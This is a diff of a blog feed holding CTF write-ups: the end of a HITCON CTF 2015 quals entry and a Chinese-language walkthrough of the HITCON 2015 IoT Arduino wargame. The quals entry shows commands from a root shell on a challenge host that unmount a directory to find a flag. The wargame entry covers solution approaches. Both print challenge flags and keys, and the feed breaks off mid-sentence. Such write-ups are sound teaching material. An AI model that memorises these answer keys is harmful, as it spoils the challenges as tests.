+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cgroups  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cmdline  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 consoles  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 cpuinfo  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 crypto  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 devices  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 diskstats  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 dma  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 driver  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 execdomains  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 fb  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 filesystems  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   8 nobody nogroup               0 Oct 19 05:26 fs  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 interrupts  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 iomem  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 ioports  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x  49 nobody nogroup               0 Oct 19 05:26 irq  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 kallsyms  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup 140737477877760 Oct 19 05:26 kcore  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 key-users  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 keys  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup               0 Oct 19 05:26 kmsg  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup               0 Oct 19 05:26 kpagecount  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup               0 Oct 19 05:26 kpageflags  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 loadavg  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 locks  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 mdstat  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 meminfo  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 misc  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 modules  &lt;/span&gt;
+&lt;span class="err"&gt;lrwxrwxrwx   1 nobody nogroup              11 Oct 19 05:26 mounts -&amp;gt; self/mounts  &lt;/span&gt;
+&lt;span class="err"&gt;-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 mtrr  &lt;/span&gt;
+&lt;span class="err"&gt;lrwxrwxrwx   1 nobody nogroup               8 Oct 19 05:26 net -&amp;gt; self/net  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 pagetypeinfo  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 partitions  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 sched_debug  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 schedstat  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   3 nobody nogroup               0 Oct 19 05:26 scsi  &lt;/span&gt;
+&lt;span class="err"&gt;lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 self -&amp;gt; 7  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup               0 Oct 19 05:26 slabinfo  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 softirqs  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  &lt;/span&gt;
+&lt;span class="err"&gt;--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  &lt;/span&gt;
+&lt;span class="err"&gt;lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&amp;gt; 7/task/7  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  &lt;/span&gt;
+&lt;span class="err"&gt;-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  &lt;/span&gt;
+&lt;span class="err"&gt;-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  &lt;/span&gt;
+&lt;span class="err"&gt;dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  &lt;/span&gt;
+&lt;span class="err"&gt;-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Let's take some search.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;root@ip-172-31-19-201:/proc# grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  &lt;/span&gt;
+&lt;span class="err"&gt;grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  &lt;/span&gt;
+&lt;span class="err"&gt;./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  &lt;/span&gt;
+&lt;span class="err"&gt;Binary file ./15/task/15/cmdline matches  &lt;/span&gt;
+&lt;span class="err"&gt;./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;Binary file ./15/cmdline matches  &lt;/span&gt;
+&lt;span class="err"&gt;./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  &lt;/span&gt;
+&lt;span class="err"&gt;./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  &lt;/span&gt;
+&lt;span class="err"&gt;./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We've already found &lt;code&gt;/chest&lt;/code&gt; before and knew it's empty.&lt;br&gt;
+So, maybe unmount it?  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;root@ip-172-31-19-201:/proc# umount /chest  &lt;/span&gt;
+&lt;span class="err"&gt;umount /chest  &lt;/span&gt;
+&lt;span class="err"&gt;root@ip-172-31-19-201:/proc# cd /chest  &lt;/span&gt;
+&lt;span class="err"&gt;cd /chest  &lt;/span&gt;
+&lt;span class="err"&gt;root@ip-172-31-19-201:/chest# ls  &lt;/span&gt;
+&lt;span class="err"&gt;ls  &lt;/span&gt;
+&lt;span class="err"&gt;jungle.chest  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;ta da!  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;root@ip-172-31-19-201:/chest# cat jungle.chest  &lt;/span&gt;
+&lt;span class="err"&gt;cat jungle.chest  &lt;/span&gt;
+&lt;span class="err"&gt;hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr&gt;
+&lt;h2&gt;Stego - unreadable [100]&lt;/h2&gt;
+&lt;p&gt;We got a file &lt;a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164"&gt;unreadable-4b2868cc26a8dad5695e537a9dd8a164&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;by using &lt;code&gt;xxd&lt;/code&gt; to check it.  &lt;/p&gt;
+&lt;p&gt;&lt;img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png"&gt;  &lt;/p&gt;
+&lt;p&gt;the flag is &lt;code&gt;hitcon{WE USE XXD INSTEAD OF IDA PRO}&lt;/code&gt;  &lt;/p&gt;</content><category term="CTF"></category><category term="HITCON"></category><category term="Write-up"></category><category term="Ruby"></category><category term="Conf"></category><category term="Security"></category></entry><entry><title>HITCON 2015 IOT Wargame</title><link href="https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/" rel="alternate"></link><published>2015-08-29T21:11:33+08:00</published><updated>2015-09-03T21:32:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-29:/posts/2015/08/29/hitcon-2015-iot-wargame/</id><summary type="html">&lt;p&gt;Write-up about HITCON 2015 CMT IOT Wargame (Python Wargame?)&lt;/p&gt;</summary><content type="html">&lt;p&gt;今年的 HITCON 的主題是 IoT，&lt;br&gt;
+所以 Wargame 也配合了 IoT 的主題，&lt;br&gt;
+用 Arduino Nano + Raspberry Pi 出題。  &lt;/p&gt;
+&lt;p&gt;Wargame 的網址是 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt;&lt;br&gt;
+&lt;img alt="IOT Wargame" src="/files/hitcon-2015-iot-wargame/iot_wargame.png"&gt;  &lt;/p&gt;
+&lt;h2&gt;Arduino Nano 部份&lt;/h2&gt;
+&lt;p&gt;Arduino Nano 的題目只有三題，&lt;br&gt;
+(原本好像有打算出四題的感覺，但可能時間來不及的關係)&lt;br&gt;
+而且難度蠻簡單的，&lt;br&gt;
+其實蠻適合所有會眾入門，&lt;br&gt;
+而且每位會眾報到後都會拿到已經把題目燒進去的 Arduino Nano。&lt;br&gt;
+(還有附排針，但題目不會用到，原本一看到以為要現場焊接XD)&lt;br&gt;
+但參與度好像不高，&lt;br&gt;
+寫這篇文章的當下，&lt;br&gt;
+總計是 243 位註冊帳號，&lt;br&gt;
+其中 161 位至少答對一題，&lt;br&gt;
+三題全部都做完的有 69 位。  &lt;/p&gt;
+&lt;p&gt;我自己是在第一天議程結束後的晚上才開始看題目，&lt;br&gt;
+然後大概花3個多小時才把三題都解出來，&lt;br&gt;
+(GeoHot 花了一個多小時就全解完了QQ)&lt;br&gt;
+以下寫一下自己的解法，&lt;br&gt;
+供有興趣的人參考，&lt;br&gt;
+有問題也歡迎回覆。  &lt;/p&gt;
+&lt;p&gt;其實題目真的不難，&lt;br&gt;
+真的有在打 Wargame 或 CTF 的人應該覺得簡單到沒必要浪費時間寫 Write-up 吧XD&lt;br&gt;
+但因為身邊還是有人不會寫，&lt;br&gt;
+所以秉持著推廣一下 Wargame 跟 CTF 的精神寫一下這部份，&lt;br&gt;
+Orange 出的 RPi 題目我就解不出來了 XDrz  &lt;/p&gt;
+&lt;h3&gt;1. 讓 Arduino Nano 能被你的電腦讀到&lt;/h3&gt;
+&lt;p&gt;老實說這應該是最難的部份了，&lt;br&gt;
+因為第一次接觸 Arduino，&lt;br&gt;
+所以我在這上面花蠻多時間的Orz&lt;br&gt;
+IRC 上也很多人在詢問，&lt;br&gt;
+有看到有人在問 Mac, Windows&lt;br&gt;
+就是沒看到有人問 Linux 的，&lt;br&gt;
+(噢，好像有看到有人問 Ubuntu 的?有點忘記了)&lt;br&gt;
+因為我本身用 Arch Linux，&lt;br&gt;
+所以這篇文章會以 Arch Linux 為主，&lt;br&gt;
+(順便偷偷推廣 &lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt; XD)  &lt;/p&gt;
+&lt;p&gt;Windows 的使用者可以參考會眾 toby 寫的教學&lt;br&gt;
+&lt;a href="http://toby.logdown.com/posts/293552/hitcon-play-nano-on-windows"&gt;HITCON 之 Windows 也要玩 Nano « Toby 'n Hack&lt;/a&gt;，&lt;br&gt;
+仍然不行的話，可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/Windows"&gt;Arduino - Windows&lt;/a&gt; 試試。  &lt;/p&gt;
+&lt;p&gt;Mac 的使用者可以參考這篇 &lt;a href="http://arduino.stackexchange.com/questions/5119/arduino-nano-no-serial-port-for-macbook-air-2013"&gt;Arduino Nano no serial port for MacBook Air 2013 - Arduino Stack Exchange&lt;/a&gt; (但有人反應裝了還是讀不到)&lt;br&gt;
+仍然不行的話，也可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/MacOSX"&gt;Arduino - MacOSX&lt;/a&gt; 試試。  &lt;/p&gt;
+&lt;p&gt;至於 Linux 的話，可以參考 Arduino 官方的這篇 &lt;a href="http://playground.arduino.cc/Learning/Linux"&gt;Arduino Playground - Linux&lt;/a&gt;。  &lt;/p&gt;
+&lt;p&gt;而 Arch Linux 的話，當然就是看官方的 &lt;a href="https://wiki.archlinux.org/index.php/Arduino"&gt;Arduino - ArchWiki&lt;/a&gt;，從 AUR 上安裝 Arduino。  &lt;/p&gt;
+&lt;p&gt;(但其實我在還沒安裝 AUR 的 Arduino 時，&lt;br&gt;
+就已經出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 了，&lt;br&gt;
+所以我覺得應該是有 driver 的，&lt;br&gt;
+但我當時還不知道怎麼改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br&gt;
+所以還是裝了 AUR 的 arduino 套件，&lt;br&gt;
+直到看到 &lt;a href="http://playground.arduino.cc/Interfacing/Python"&gt;Arduino Playground - Python&lt;/a&gt;&lt;br&gt;
+才發現是 &lt;code&gt;port&lt;/code&gt; 的值錯了&lt;br&gt;
+才覺得一開始可能不用裝 &lt;code&gt;arduino&lt;/code&gt; 也會動，&lt;br&gt;
+但也懶的移除了。&lt;br&gt;
+所以如果有人也有這樣的情況，然後也還沒裝 arduino 的話，&lt;br&gt;
+可以先試試看直接改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br&gt;
+看能不能用，這樣就不用多裝 3xx MB 的 arduino 套件了。&lt;br&gt;
+至於怎麼改 port，下面會提到)  &lt;/p&gt;
+&lt;p&gt;如果沒有出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 或是試了不成功的話，&lt;br&gt;
+就繼續試試  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;yaourt -S arduino  &lt;/span&gt;
+&lt;span class="err"&gt;sudo gpasswd -a $user uucp  &lt;/span&gt;
+&lt;span class="err"&gt;sudo gpasswd -a $user lock  &lt;/span&gt;
+&lt;span class="err"&gt;sudo gpasswd -a $user tty  &lt;/span&gt;
+&lt;span class="err"&gt;sudo modprobe cdc_acm  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;之後，登出再登入。&lt;br&gt;
+ArchWiki 上是說會出現 &lt;code&gt;/dev/ttyACMx&lt;/code&gt; (x 為數字)&lt;br&gt;
+但我的是 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt;，一樣可以正常使用。  &lt;/p&gt;
+&lt;p&gt;用 &lt;code&gt;screen /dev/ttyUSB0 115200&lt;/code&gt; 確認有顯示以下內容就是有讀到了  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;HITCON&lt;/span&gt; &lt;span class="mi"&gt;2015&lt;/span&gt; &lt;span class="n"&gt;NANO&lt;/span&gt; &lt;span class="n"&gt;GAME&lt;/span&gt;  
+
+&lt;span class="n"&gt;Nano$&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Morse&lt;/span&gt;  
+&lt;span class="n"&gt;Nano$&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Maze&lt;/span&gt;  
+&lt;span class="n"&gt;Nano$&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Calculator&lt;/span&gt;  
+&lt;span class="n"&gt;Nano$&lt;/span&gt; &lt;span class="n"&gt;enter&lt;/span&gt; &lt;span class="n"&gt;your&lt;/span&gt; &lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3&gt;2. 透過 pip 安裝 pyserial&lt;/h3&gt;
+&lt;p&gt;在使用官方提供的 &lt;code&gt;ans.py&lt;/code&gt; 之前，&lt;br&gt;
+記得先安裝必要的套件 &lt;code&gt;pyserial&lt;/code&gt;&lt;br&gt;
+使用 &lt;code&gt;pip install pyserial&lt;/code&gt;&lt;br&gt;
+安裝完後，打開 &lt;code&gt;ans.py&lt;/code&gt;&lt;br&gt;
+將第 67 行的 &lt;code&gt;port=3&lt;/code&gt; 改成 &lt;code&gt;port='/dev/ttyUSB0'&lt;/code&gt;&lt;br&gt;
+(這邊的 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 視實際情況更改)&lt;br&gt;
+就可以開始修改 &lt;code&gt;ans.py&lt;/code&gt; 進行 Python Wargame 了(?)  &lt;/p&gt;
+&lt;p&gt;修改第 47 行的 choice 可以選擇要解的題目，&lt;br&gt;
+'0' == NANO 1&lt;br&gt;
+'1' == NANO 2&lt;br&gt;
+'2' == NANO 3  &lt;/p&gt;
+&lt;p&gt;每個 *.tgz 用 &lt;code&gt;tar zxvf $tgz_file&lt;/code&gt; 解開&lt;br&gt;
+每個裡面的 readme.txt 基本上都一樣的，不太需要看  &lt;/p&gt;
+&lt;p&gt;每題拿到 key 之後，&lt;br&gt;
+請複製該 key，&lt;br&gt;
+再到 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt; 登入，&lt;br&gt;
+然後點選對應的題目，&lt;br&gt;
+至右下角 &lt;code&gt;enter key&lt;/code&gt; 欄位，&lt;br&gt;
+貼上 key，之後按 send 送出。  &lt;/p&gt;
+&lt;p&gt;以下開始講解各題：  &lt;/p&gt;
+&lt;h3&gt;NANO 1&lt;/h3&gt;
+&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-1.tgz"&gt;NANO 1 原始檔&lt;/a&gt;&lt;br&gt;
+這題會拿到一串&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81"&gt;摩斯密碼&lt;/a&gt;&lt;br&gt;
+&lt;code&gt;.... .. - -.-. --- -. -. .- -. --- --. .- -- . -- --- .-. ... .&lt;/code&gt;&lt;br&gt;
+隨便找個解摩斯密碼的網站 &lt;a href="http://morsecode.scphillips.com/translator.html"&gt;http://morsecode.scphillips.com/translator.html&lt;/a&gt;&lt;br&gt;
+解碼後得到 &lt;code&gt;HITCONNANOGAMEMORSE&lt;/code&gt;&lt;br&gt;
+把 &lt;code&gt;game0()&lt;/code&gt; 的 &lt;code&gt;answer = ''&lt;/code&gt; 改成 &lt;code&gt;answer = 'HITCONNANOGAMEMORSE'&lt;/code&gt;&lt;br&gt;
+再執行一次 &lt;code&gt;ans.py&lt;/code&gt; 便可得到 key  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Nano$ key is 457E1A295B9D1C48&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;NANO 2&lt;/h3&gt;
+&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-2.tgz"&gt;NANO 2 原始檔&lt;/a&gt;&lt;br&gt;
+這是三題裡面最難的一題，也是三題中最少人解出來的。&lt;br&gt;
+這題要在九秒內走出 &lt;code&gt;14*14&lt;/code&gt; 的迷宮，&lt;br&gt;
+從 &lt;code&gt;(0, 0)&lt;/code&gt; 走到 &lt;code&gt;(14,14)&lt;/code&gt;&lt;br&gt;
+(除非你手速夠快，不然以本題的設計基本上九秒走不完)  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;O&amp;#39; 代表人、&amp;#39;.&amp;#39; 代表路、&amp;#39;+&amp;#39; 代表牆、&amp;#39;X&amp;#39; 代表出口  &lt;/span&gt;
+&lt;span class="err"&gt;&amp;#39;w&amp;#39; 往上走、&amp;#39;a&amp;#39; 往左走、&amp;#39;s&amp;#39; 往下走、&amp;#39;d&amp;#39; 往右走  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;必須修改 &lt;code&gt;game1()&lt;/code&gt; 裡頭的內容，&lt;br&gt;
+把走迷宮的演算法寫在裏面。  &lt;/p&gt;
+&lt;p&gt;我用的方法其實是半自動的，在必要的時候需要手動，也不保證每次成功。&lt;br&gt;
+(要全自動的話可能需要用 &lt;a href="https://en.wikipedia.org/wiki/Breadth-first_search"&gt;BFS&lt;/a&gt;，但我太廢，覺得這樣已經能解出題目就夠了。)  &lt;/p&gt;
+&lt;p&gt;程式每次會呈獻 3x3 的現在位置地圖，&lt;br&gt;
+因為 'O' 每次的位置不固定，&lt;br&gt;
+所以先找到 'O' 的現在位置後，&lt;br&gt;
+將其紀錄為 &lt;code&gt;pos_x&lt;/code&gt; 和 &lt;code&gt;pos_y&lt;/code&gt;，&lt;br&gt;
+方便之後判斷其上下左右是否可走。  &lt;/p&gt;
+&lt;p&gt;再來因為我們要往右下方行走才能到達出口，&lt;br&gt;
+所以就判斷如果 'O' 的右邊(&lt;code&gt;lines[pos_y, pos_x+1]&lt;/code&gt;) 是 '.'(路) 的話就往右走，&lt;br&gt;
+已右邊舉例的話，如果有下列情況的話，就改換下一個優先的方向檢查： (按照 右、下、左、上 的順序)  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;邊界(&lt;code&gt;pos_x == 2&lt;/code&gt;)  (&lt;code&gt;pos_x+ 1&lt;/code&gt; 就超出邊界了)  &lt;/li&gt;
+&lt;li&gt;'O' 的右邊是 '+' (牆)  &lt;/li&gt;
+&lt;li&gt;上一步是往左走(往反方向走)  &lt;ul&gt;
+&lt;li&gt;避免左右左右、上下上下這種不會前進的狀況發生  &lt;/li&gt;
+&lt;li&gt;造成了另一個問題，每當走入三面都是牆的洞的時候，就會卡住。  &lt;/li&gt;
+&lt;li&gt;這時就會需要手動移動  &lt;/li&gt;
+&lt;li&gt;因為要得知上一步，所以我建立了 &lt;code&gt;steps = [None]&lt;/code&gt; 紀錄每一步的順序  &lt;/li&gt;
+&lt;li&gt;把每次的移動利用 &lt;code&gt;steps.append()&lt;/code&gt; 紀錄起來  &lt;/li&gt;
+&lt;li&gt;並在每次透過 &lt;code&gt;steps[-1]&lt;/code&gt; 得知上一步  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;依此類推，照著 &lt;code&gt;右、下、左、上、手動&lt;/code&gt; 的先後順序，寫出程式碼。&lt;br&gt;
+開始執行後，遇到卡住的狀況就手動控制，試個幾次很快就可以走出迷宮  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Nano$ key is 3D52CB746F9E6C83&lt;/code&gt;  &lt;/p&gt;
+&lt;h3&gt;NANO 3&lt;/h3&gt;
+&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-3.tgz"&gt;NANO 3 原始檔&lt;/a&gt;&lt;br&gt;
+這題是必須在一秒內回答四則運算的結果，&lt;br&gt;
+看一下題目，可以發現題目的字串長的像這樣&lt;br&gt;
+&lt;code&gt;Nano$ 7 * 10 - 14 + 6 - 5 - 19 = ?&lt;/code&gt;&lt;br&gt;
+所以可以透過 Regular Expression&lt;br&gt;
+&lt;a href="https://docs.python.org/2/library/re.html"&gt;7.2. re — Regular expression operations — Python 2.7.10 documentation&lt;/a&gt;&lt;br&gt;
+把 &lt;code&gt;7 * 10 - 14 + 6 - 5 - 19&lt;/code&gt; 取出來後&lt;br&gt;
+丟給 &lt;a href="https://docs.python.org/2/library/functions.html#eval"&gt;eval()&lt;/a&gt; 算出結果，&lt;br&gt;
+再把值 assign 給 answer 回答。&lt;br&gt;
+(&lt;code&gt;eval()&lt;/code&gt; 可以把字串當作 expression 進行求值，雖然很方便，但真正在開發程式的時候最好不要亂用，尤其是不要把使用者輸入的資料丟給 &lt;code&gt;eval()&lt;/code&gt;，因為你永遠不知道使用者會輸入什麼奇怪的東西)&lt;br&gt;
+照著這個想法修改一下 &lt;code&gt;game2()&lt;/code&gt;，這題應該就解決了  &lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Nano$ key is 273A9C1E2D380B48&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;極度建議自己寫程式碼，&lt;br&gt;
+真的真的想不出來的話再點下面的連結吧！&lt;br&gt;
+不然是不會進步的。&lt;br&gt;
+程式碼請見：&lt;a href="https://gist.github.com/M157q/164f9ba5bd8ae0b18afe"&gt;https://gist.github.com/M157q/164f9ba5bd8ae0b18afe&lt;/a&gt;  &lt;/p&gt;
+&lt;p&gt;然後看到 IRC 有人提到，&lt;br&gt;
+他把 Nano 上的 binary dump 到電腦上，&lt;br&gt;
+直接用 &lt;code&gt;strings&lt;/code&gt; 拿到 3 個 key，&lt;br&gt;
+不知道怎麼做到的&lt;br&gt;
